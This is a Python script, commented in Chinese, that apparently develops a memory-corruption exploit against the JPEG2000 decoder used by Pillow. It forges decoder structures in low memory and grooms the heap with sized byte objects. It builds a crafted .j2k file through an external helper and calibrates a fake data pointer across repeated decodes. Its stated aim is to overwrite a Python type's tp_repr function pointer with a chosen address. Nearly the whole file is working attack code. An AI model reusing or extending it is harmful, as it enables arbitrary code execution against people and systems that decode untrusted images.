#!/usr/bin/env python3
# 字段对齐版：树按真实码流参数（tile 8x8 / 1 res / 1 band / 1 prec / 1 cblk）
#   并加信号处理器：孩子崩之前把 scratch 内容 dump 出来 => 判定"解码器有没有往 data 写"
import ctypes, gc, io, os, re, signal, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908
VAL = 0x00451A9C
PAY = '/tmp/fa.j2k'
BUILT = '/tmp/fab.j2k'
DUMP = '/tmp/fa_dump.bin'
HOLD = []


def low_buffer(n):
    for _ in range(64):
        b = bytearray(n)
        v = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, v))
        a = ctypes.addressof(v)
        if a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


def W64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def W32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


def Wf(a, v):
    ctypes.c_float.from_address(a).value = v


ST_O, ST = low_buffer(8192)
TC = ST + 0x000
RS = ST + 0x200
BD = ST + 0x400
PR = ST + 0x600
CB = ST + 0x800
SG = ST + 0xA00
CH = ST + 0xC00
SEG = ST + 0x1000
SCR_O, SCRATCH = low_buffer(4096)
ctypes.memset(SCRATCH, 0xAA, 4096)
print("[*] ST=%#x TC=%#x SEG=%#x SCRATCH=%#x" % (ST, TC, SEG, SCRATCH))
if max(TC, RS, BD, PR, CB, SG, CH, SEG, SCRATCH) >= 0x1000000:
    print("[!] 地址不可表达"); sys.exit(1)


def enc_payload(byte_val):
    code = ("from PIL import Image\n"
            "im = Image.new('L', (16,16))\n"
            "im.putdata([%d] + [0]*255)\n"
            "im.save(%r,'JPEG2000', tile_size=(8,8), num_resolutions=1)\n" % (byte_val, PAY))
    subprocess.run([sys.executable, '-c', code], capture_output=True, check=True)


def load_segment(off, seglen):
    d = open(PAY, 'rb').read()
    sots = []
    i = 0
    while True:
        j = d.find(b'\xff\x90', i)
        if j < 0:
            break
        sots.append(j)
        k = d.find(b'\xff\x93', j)
        if k < 0:
            break
        i = k + 2
    eoc = d.rfind(b'\xff\xd9')
    tp0 = d[sots[0]:sots[1] if len(sots) > 1 else eoc]
    sod = tp0.find(b'\xff\x93')
    body = tp0[sod + 2:]
    return body[off:off + seglen]


def build_tree(seglen, target):
    # ---- tilecomp（112B）----
    W32(TC + 0x00, 0); W32(TC + 0x04, 0); W32(TC + 0x08, 8); W32(TC + 0x0c, 8)
    W32(TC + 0x10, 0)      # compno
    W32(TC + 0x14, 1)      # numresolutions
    W32(TC + 0x18, 1)      # minimum_num_resolutions
    W64(TC + 0x20, RS)     # resolutions
    W32(TC + 0x28, 40)     # resolutions_size
    W64(TC + 0x30, target) # data
    W32(TC + 0x38, 0)      # ownsData
    W64(TC + 0x40, 4096)   # data_size_needed
    W64(TC + 0x48, 4096)   # data_size
    W64(TC + 0x50, 0); W64(TC + 0x58, 0); W64(TC + 0x60, 0); W64(TC + 0x68, 0)
    W64(TC + 0x70, 64)     # numpix = 8*8
    # ---- resolution[0]（40B）：尺寸 = tile 8x8 ----
    W32(RS + 0x00, 0); W32(RS + 0x04, 0); W32(RS + 0x08, 8); W32(RS + 0x0c, 8)
    W32(RS + 0x10, 1); W32(RS + 0x14, 1)   # pw/ph = 1 precinct
    W32(RS + 0x18, 1)                      # numbands
    W64(RS + 0x20, BD)
    # ---- band[0]（48B）----
    W32(BD + 0x00, 0); W32(BD + 0x04, 0); W32(BD + 0x08, 8); W32(BD + 0x0c, 8)
    W32(BD + 0x10, 0)                      # bandno = 0 (LL)
    W64(BD + 0x18, PR)
    W32(BD + 0x20, 56)                     # precincts_data_size
    W32(BD + 0x24, 8)                      # numbps
    Wf(BD + 0x28, 1.0)
    # ---- precinct[0]（56B）----
    W32(PR + 0x00, 0); W32(PR + 0x04, 0); W32(PR + 0x08, 8); W32(PR + 0x0c, 8)
    W32(PR + 0x10, 1); W32(PR + 0x14, 1)   # cw/ch = 1 code-block
    W64(PR + 0x18, CB)
    W32(PR + 0x20, 88)                     # block_size
    W64(PR + 0x28, 0); W64(PR + 0x30, 0)
    # ---- cblk[0]（88B）----
    W64(CB + 0x00, SG)
    W64(CB + 0x08, CH)
    W32(CB + 0x10, 0); W32(CB + 0x14, 0); W32(CB + 0x18, 8); W32(CB + 0x1c, 8)
    W32(CB + 0x20, 8)                      # Mb
    W32(CB + 0x24, 8)                      # numbps
    W32(CB + 0x28, 3)                      # numlenbits
    W32(CB + 0x2c, 1)                      # numnewpasses
    W32(CB + 0x30, 1)                      # numsegs
    W32(CB + 0x34, 1)                      # real_num_segs
    W32(CB + 0x38, 1)                      # m_current_max_segs
    W32(CB + 0x3c, 1)                      # numchunks
    W32(CB + 0x40, 1)                      # numchunksalloc
    W64(CB + 0x48, 0); W32(CB + 0x50, 0)
    # ---- seg[0]（24B）----
    W32(SG + 0x00, seglen); W32(SG + 0x04, 1); W32(SG + 0x08, 1)
    W32(SG + 0x0c, 1); W32(SG + 0x10, 1); W32(SG + 0x14, seglen)
    # ---- chunk[0]（16B）----
    W64(CH + 0x00, SEG); W32(CH + 0x08, seglen)


def build_file(A):
    C = A + 0x8000
    code = ("import subprocess,sys\n"
            "r = subprocess.run(['python3','/tmp/mk13.py',%r,%r,'0','23',%r,%r,%r,'-370'],\n"
            "                   capture_output=True,text=True)\n"
            "sys.stdout.write(r.stdout)\n" % (PAY, BUILT, hex(A), hex(A + 0x1000), hex(C)))
    r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True)
    return (r.stdout or '').strip() or (r.stderr or '')[:70]


def on_signal(sig, frm):
    try:
        with open(DUMP, 'wb') as f:
            f.write(ctypes.string_at(SCRATCH, 64))
            f.write(ctypes.string_at(TP_REPR, 16))
    except Exception:
        pass
    os._exit(0)


def run_child(path, logpath):
    pid = os.fork()
    if pid == 0:
        fd = os.open(logpath, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        os.dup2(fd, 2)
        for s in (signal.SIGABRT, signal.SIGSEGV, signal.SIGBUS):
            signal.signal(s, on_signal)
        try:
            gc.collect()
            prime = [bytes(519) for _ in range(1024)]
            del prime
            pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
            good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
            if good:
                keep = [t for i, t in enumerate(good) if i != len(good) // 2]
                Ks = [B for (D, B) in keep]
                holeD = good[len(good) // 2][0]
                del holeD, pairs, good
                gc.collect()
                M = open(path, 'rb').read()
                im = Image.open(io.BytesIO(M)); im.load()
        except BaseException:
            pass
        with open(DUMP, 'wb') as f:
            f.write(ctypes.string_at(SCRATCH, 64))
            f.write(ctypes.string_at(TP_REPR, 16))
        os._exit(0)
    os.waitpid(pid, 0)
    log = open(logpath, errors='ignore').read()
    dump = b''
    if os.path.exists(DUMP):
        dump = open(DUMP, 'rb').read()
    return log, dump


def comps_written(log):
    v = None
    for ln in log.splitlines():
        m = re.search(r'write_at=\+584 val=(0x[0-9a-f]+)', ln)
        if m:
            v = int(m.group(1), 16)
    return v


print("[*] tp_repr 原值 = %#x  目标 = %#x" % (R(TP_REPR), VAL))
print("[*] scratch 已填 0xAA")

byte_val = VAL & 0xFF
enc_payload(byte_val)
seg = load_segment(2, 64)
ctypes.memmove(SEG, seg, len(seg))
build_tree(len(seg), SCRATCH)      # 先写 scratch，验证写路径

A = TC - 0x0c
for attempt in range(8):
    out = build_file(A)
    if 'OK' not in out:
        print("build 失败 %s" % out[:50]); break
    log, dump = run_child(BUILT, '/tmp/fa_%d.log' % attempt)
    w = comps_written(log)
    print("attempt%d: comps写=%s" % (attempt + 1, hex(w) if w else '无'))
    if w == TC:
        print("[*] 标定OK")
        break
    if w is None:
        continue
    A += (TC - w)

scr = dump[:64] if len(dump) >= 64 else b''
tp = dump[64:80] if len(dump) >= 80 else b''
print()
print("[*] scratch 前 16B:", scr[:16].hex() if scr else '(无 dump)')
print("[*] 未被改动字节数:", sum(1 for b in scr if b == 0xAA), "/", len(scr))
print("[*] dump 里的 tp_repr 16B:", tp.hex() if tp else '(无)')
print("[*] 当前 tp_repr = %#x" % R(TP_REPR))
if scr and any(b != 0xAA for b in scr):
    print("\n*** 解码器确实写进了 fake.data（写路径成立）***")
else:
    print("\n(写路径未到达 fake.data)")